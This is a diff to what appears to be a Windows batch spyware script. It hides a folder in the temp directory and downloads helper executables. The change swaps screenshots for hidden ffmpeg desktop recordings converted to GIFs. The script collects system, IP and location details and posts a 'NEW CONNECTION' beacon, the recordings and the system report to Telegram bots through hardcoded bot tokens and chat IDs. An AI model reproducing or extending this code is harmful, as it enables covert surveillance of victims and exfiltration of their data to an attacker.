@@ -24,7 +24,9 @@ attrib +s +h +i "%temp%\%folder%"
 cd "%temp%\%folder%"
 "%environment%\curl.exe" -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
 "%environment%\curl.exe" -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
-"%environment%\nircmd.exe" savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
+powershell "start cmd.exe -Args \"/K %environment%\ffmpeg.exe -f gdigrab -i desktop -t 5 -vcodec libx264 -f %temp%\record.mp4\" -WindowStyle Hidden"
+timeout -t 6
+powershell "start cmd.exe -Args \"/K %environment%\ffmpeg.exe -i %temp%\record.mp4 -pix_fmt yuv420p %temp%\record.gif\" -WindowStyle Hidden"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 "speedtest.exe" --accept-license | echo YES
 "speedtest.exe" --accept-gdpr >> "%username%@%computername%.txt"
@@ -73,7 +75,7 @@ tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp= ")
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %WS%!newtemp!] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
-for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 
+for %%# in ("*.gif") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-932893443 
 setlocal disableDelayedExpansion
 
